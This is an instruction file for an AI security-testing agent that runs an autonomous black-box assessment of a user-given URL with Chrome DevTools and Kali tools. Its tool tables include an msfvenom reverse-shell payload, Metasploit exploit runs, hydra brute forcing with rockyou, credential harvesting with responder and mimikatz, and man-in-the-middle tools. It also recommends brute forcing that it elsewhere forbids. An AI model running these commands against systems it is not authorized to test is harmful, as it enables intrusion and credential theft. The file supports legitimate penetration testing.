---
description: Run a complete autonomous black-box security assessment using Chrome DevTools and Kali Linux
agent: BlackBoxAnalyst
subtask: true
---

Execute a complete, autonomous black-box security assessment. You discover the attack surface through the browser and JS analysis — you do NOT read the project's source code.

## CRITICAL: Initial Questions

Before doing anything, ask the user the following questions:
1. **Target URL** — What is the target URL to assess? (e.g., `https://example.com`)
2. **Test Plan Name** — What should the security test plan be named?
3. **Additional Context** — Is there anything you should be aware of during the tests? (e.g., known issues, sensitive data, rate limits, specific areas to focus on, things to avoid)

## CRITICAL: Chrome DevTools for Discovery

You MUST use Chrome DevTools to discover and map the attack surface. This is the core of your assessment methodology.

Your procedure for browser-based discovery:
1. Call `chrome_devtools_navigate_page` to navigate to the target URL.
2. Call `chrome_devtools_take_snapshot` to enumerate all DOM elements — forms, buttons, hidden inputs, links.
3. Click through navigation to trigger network requests, then call `chrome_devtools_list_network_requests` to capture all API endpoints.
4. For each interesting request, call `chrome_devtools_get_network_request` to inspect headers, cookies, and response bodies.
5. Call `chrome_devtools_list_console_messages` to find JS errors leaking internal URLs or sensitive data.
6. Call `chrome_devtools_evaluate_script` to check cookies, localStorage, CSP headers, and security configuration.
7. Take screenshots with `chrome_devtools_take_screenshot` to document findings.

## CRITICAL: JS File Analysis

After browser discovery, you MUST also fetch and analyze JS files to find hidden endpoints:
1. Fetch the main HTML page with `curl` to find JS bundle URLs.
2. For each JS file, fetch its content and grep for:
   - API route patterns (`/api/`, `/v1/`, `/v2/`)
   - Fetch/axios calls with endpoint URLs
   - Hardcoded secrets or API keys
   - Admin endpoints (`/admin`, `/dashboard`, `/manager`)
   - File upload endpoints (`/upload`, `/files`)
3. Cross-reference with network-discovered endpoints.

## CRITICAL: Authentication Setup

You MUST ask the user for login credentials before attempting authentication. Never guess or brute force login pages.

## CRITICAL: Kali Linux for Security Scanning

You MUST use the Kali Linux container to run security tools. **Never run exploit modules** — only reconnaissance and vulnerability detection tools.

Your procedure for security scanning:
1. Verify the Kali container is running: `docker exec autoqa-kali whoami`
2. Use `bash` with `docker exec autoqa-kali <tool> <target>` to execute tools against the target for each phase.
3. Save tool output to files for later reference: `docker exec autoqa-kali nmap <target> > /tmp/recon.txt`

## Tool Reference by Category

### Network Discovery & Reconnaissance
| Tool | Purpose | Example |
|------|---------|---------|
| `nmap` | Port scanning, service/version detection | `docker exec autoqa-kali nmap -sV -sC -p 80,443,8080 <target>` |
| `masscan` | Ultra-fast TCP port scan | `docker exec autoqa-kali masscan -p80,443 <target> --rate 1000` |
| `httpx` | HTTP probe, tech detection, status codes | `docker exec autoqa-kali httpx -u <target> -st -td -tech-detect` |
| `whatweb` | Website fingerprinting (CMS, frameworks, versions) | `docker exec autoqa-kali whatweb -v <target>` |
| `wafw00f` | Web Application Firewall detection | `docker exec autoqa-kali wafw00f <target>` |
| `sslyze` | SSL/TLS scanning and analysis | `docker exec autoqa-kali sslyze --regular <target>` |

### Web Application Scanning
| Tool | Purpose | Example |
|------|---------|---------|
| `nuclei` | Fast vulnerability scanner using YAML templates | `docker exec autoqa-kali nuclei -u <target> -c 20` |
| `nikto` | Web server scanner for dangerous files, CGIs, misconfigs | `docker exec autoqa-kali nikto -h <target> -C all` |
| `wapiti` | Black-box web vulnerability scanner | `docker exec autoqa-kali wapiti --url <target> --flush` |
| `zaproxy` | OWASP ZAP — web app scanner and proxy | `docker exec autoqa-kali zap-baseline.py -t <target>` |
| `arachni` | Web application vulnerability scanner | `docker exec autoqa-kali arachni <target> --output-serializer=compact` |

### Directory & Content Discovery
| Tool | Purpose | Example |
|------|---------|---------|
| `gobuster` | Directory/file and DNS brute-forcing | `docker exec autoqa-kali gobuster dir -u <target> -w /usr/share/wordlists/dirb/common.txt` |
| `ffuf` | Fast web fuzzer for paths, params, headers | `docker exec autoqa-kali ffuf -u <target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt` |
| `feroxbuster` | Fast directory brute-forcer in Rust | `docker exec autoqa-kali feroxbuster -u <target>` |
| `wfuzz` | Web fuzzer with multiple payloads | `docker exec autoqa-kali wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 <target>/FUZZ` |
| `dirb` | Web content scanner | `docker exec autoqa-kali dirb <target> /usr/share/wordlists/dirb/common.txt` |
| `hakrawler` | Fast web crawler for endpoint discovery | `docker exec autoqa-kali hakrawler -url <target>` |

### SQL Injection Testing
| Tool | Purpose | Example |
|------|---------|---------|
| `sqlmap` | Automated SQL injection and DB takeover | `docker exec autoqa-kali sqlmap -u "<target>?id=1" --batch --crawl --level=3 --risk=1` |
| `commix` | Automated command injection scanner | `docker exec autoqa-kali commix --url="<target>?cmd=test" --batch` |
| `sqlninja` | SQL injection toolkit for MS SQL Server | `docker exec autoqa-kali sqlninja` |

### XSS & Command Injection
| Tool | Purpose | Example |
|------|---------|---------|
| `xsstrike` | Advanced XSS scanner | `docker exec autoqa-kali xsstrike -u "<target>?q=test"` |
| `xsser` | XSS vulnerability scanner | `docker exec autoqa-kali xsser --url="<target>" --testing` |
| `dotdotpwn` | Directory traversal fuzzer | `docker exec autoqa-kali dotdotpwn -h <target> -m http` |

### Authentication & Password Attacks
| Tool | Purpose | Example |
|------|---------|---------|
| `hydra` | Network login cracker (100+ protocols) | `docker exec autoqa-kali hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form` |
| `medusa` | Fast parallel login brute-forcer | `docker exec autoqa-kali medusa -h <target> -u admin -P /usr/share/wordlists/rockyou.txt -t 3 -m http-form` |
| `ncrack` | Network authentication cracker | `docker exec autoqa-kali ncrack --user admin -P /usr/share/wordlists/rockyou.txt <target>` |
| `patator` | Multi-purpose brute-forcer | `docker exec autoqa-kali patator http_fuzz url=<target>/login` |
| `john` | Password cracker supporting 300+ hash types | `docker exec autoqa-kali john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` |
| `hashcat` | GPU-accelerated password recovery | `docker exec autoqa-kali hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt` |
| `cewl` | Custom wordlist generator from websites | `docker exec autoqa-kali cewl -w /tmp/custom_wordlist.txt <target>` |
| `mimikatz` | Windows credential extraction | `docker exec autoqa-kali mimikatz` |

### Exploitation Frameworks
| Tool | Purpose | Example |
|------|---------|---------|
| `msfconsole` | Metasploit interactive console | `docker exec autoqa-kali msfconsole -x "use exploit/multi/http; set RHOSTS <target>; run"` |
| `msfvenom` | Payload generator | `docker exec autoqa-kali msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> -f elf > shell.elf` |
| `setoolkit` | Social-Engineer Toolkit | `docker exec autoqa-kali setoolkit` |
| `pocsuite3` | PoC exploitation framework (CVE-Pocsuite3) | `docker exec autoqa-kali pocsuite3 -r poc.py -u <target>` |
| `beef-xss` | Browser Exploitation Framework | `docker exec autoqa-kali beef-xss` |

### Post-Exploitation & Enumeration
| Tool | Purpose | Example |
|------|---------|---------|
| `netexec` | Post-exploitation for Windows/AD | `docker exec autoqa-kali nxc smb <target> -u user -p pass` |
| `enum4linux` | Enumerate info from Windows/Samba systems | `docker exec autoqa-kali enum4linux -a <target>` |
| `smbmap` | Enumerate SMB shares and file permissions | `docker exec autoqa-kali smbmap -H <target> -u '' -p ''` |
| `linux-exploit-suggester` | Linux privilege escalation checker | `docker exec autoqa-kali linux-exploit-suggester` |

### SSL/TLS & Configuration
| Tool | Purpose | Example |
|------|---------|---------|
| `testssl.sh` | Comprehensive SSL/TLS testing | `docker exec autoqa-kali testssl.sh <target>` |
| `sslyze` | SSL/TLS scanning | `docker exec autoqa-kali sslyze --regular <target>` |
| `sslscan` | SSL/TLS port scanner | `docker exec autoqa-kali sslscan <target>` |

### Network Sniffing & MITM
| Tool | Purpose | Example |
|------|---------|---------|
| `tshark` | CLI version of Wireshark | `docker exec autoqa-kali tshark -i eth0 -Y "http.request" -T fields -e http.host -e http.uri` |
| `bettercap` | Network attack framework | `docker exec autoqa-kali bettercap -T` |
| `ettercap` | Man-in-the-middle attacks | `docker exec autoqa-kali ettercap -T -q` |
| `responder` | LLMNR/NBT-NS poisoner, credential harvester | `docker exec autoqa-kali responder -I eth0` |
| `mitmproxy` | Interactive HTTPS proxy | `docker exec autoqa-kali mitmproxy` |
| `tcpdump` | Packet capture | `docker exec autoqa-kali tcpdump -i eth0 -w /tmp/capture.pcap` |

### Secret & Credential Discovery
| Tool | Purpose | Example |
|------|---------|---------|
| `gitleaks` | Git secret scanner | `docker exec autoqa-kali gitleaks detect -s /path/to/repo` |
| `trufflehog` | Secret/credential scanner in git repos | `docker exec autoqa-kali trufflehog git <url>` |
| `h8mail` | OSINT email reconnaissance | `docker exec autoqa-kali h8mail -t target@email.com` |

### Tunneling & Proxying
| Tool | Purpose | Example |
|------|---------|---------|
| `proxychains4` | Route traffic through proxies | `docker exec autoqa-kali proxychains4 nmap <target>` |
| `ligolo-ng` | Advanced tunneling | `docker exec autoqa-kali ligolo-ng` |
| `chisel` | Fast TCP/UDP tunnel over HTTP | `docker exec autoqa-kali chisel server -p 8000 --reverse` |

## Full Workflow (Execute in Order)

### Phase 1: Browser Reconnaissance
1. Call `chrome_devtools_navigate_page` to navigate to the target URL.
2. Call `chrome_devtools_take_snapshot` to enumerate all DOM elements.
3. Click through visible navigation to trigger network requests.
4. Call `chrome_devtools_list_network_requests` to capture all API endpoints.
5. Call `chrome_devtools_get_network_request` on interesting endpoints to inspect details.
6. Call `chrome_devtools_list_console_messages` to find info leakage.
7. Call `chrome_devtools_evaluate_script` to check cookies, localStorage, CSP headers.
8. Take a screenshot with `chrome_devtools_take_screenshot`.

### Phase 2: Static JS Discovery
9. Fetch the main HTML with `curl` to find JS bundle URLs.
10. For each JS file, fetch content and grep for API routes, secrets, admin endpoints.
11. Cross-reference discovered endpoints with network-discovered ones.

### Phase 3: Authentication Mapping
12. **Ask the user for login credentials (username + password).**
13. Navigate to the login page and take a snapshot with `chrome_devtools_take_snapshot`.
14. Fill the login form with `chrome_devtools_fill` and submit with `chrome_devtools_click`.
15. After login, call `chrome_devtools_evaluate_script` to capture auth tokens.
16. Navigate to key sections and capture authenticated network requests.

### Phase 4: Security Scan Planning
17. Call `get_test_plans` to check for existing security plans.
18. If none exist, call `create_test_plan(name=..., project_name=..., plan_type='security', test_scope=..., exclude_scope=...)` with discovered endpoints in `test_scope`.

### Phase 5: Kali Security Scans
19. Verify Kali container is running: `docker exec autoqa-kali whoami`
20. Call `create_test_run` to initialize a new run.
21. For each phase (recon, vuln, auth, input, config, report): use `bash` with `docker exec autoqa-kali <tool> <target>` to run security tools.

**Recommended tool selection per phase:**
- **Recon:** `httpx` → `whatweb` → `wafw00f` → `nmap`
- **Vulnerability:** `nuclei` → `gobuster`/`ffuf` → `nikto` → `wapiti`
- **Auth:** `hydra` (rate-limited) → `cewl` (custom wordlist) → manual session analysis
- **Input Validation:** `sqlmap` (read-only) → `xsstrike` → `commix` → `dotdotpwn` → manual testing via Chrome DevTools
- **Config:** `testssl.sh` → manual header analysis via curl

22. Save output to files for later analysis.
23. **For every vulnerability found:** Investigate impact, then call `create_incident` immediately.
24. **For every interesting discovery not tied to a specific test step:** Call `create_finding(run_id, title, description, category)` with the appropriate category. Register findings for all browser-based observations (cookies, CSP, localStorage), JS analysis discoveries (hardcoded secrets, hidden endpoints), and infrastructure details.

### Phase 6: Complete
25. After all phases execute, call `complete_test_run` with the appropriate final status.
26. Provide a summary report: discovery phase results, vulnerabilities found by severity, findings logged, tools used, and output file locations.

## Reminders
- You are a **security tester, not a fixer**. Find vulnerabilities, do not fix them.
- You discover the attack surface through the browser and JS analysis — do NOT read source code.
- Run autonomously — only ask the user for target URL and credentials you cannot infer.
- Security assessments do NOT use test steps. The 6 phases are methodology categories, not scripted test cases.
- Create incidents for vulnerabilities **immediately** upon discovery.
- Register findings for **every** interesting discovery from browser analysis and JS inspection — especially cookie flags, CSP headers, localStorage data, hardcoded secrets, and discovered endpoints.
- Be thorough: enumerate every form field, every API endpoint, every hidden input.
- Respect safety constraints: read-only modes, rate limits, no destructive actions.
- Always ask for credentials before authentication — never guess or brute force.
- Classify severity accurately: low (informational), medium (exploitable with effort), high (directly exploitable).
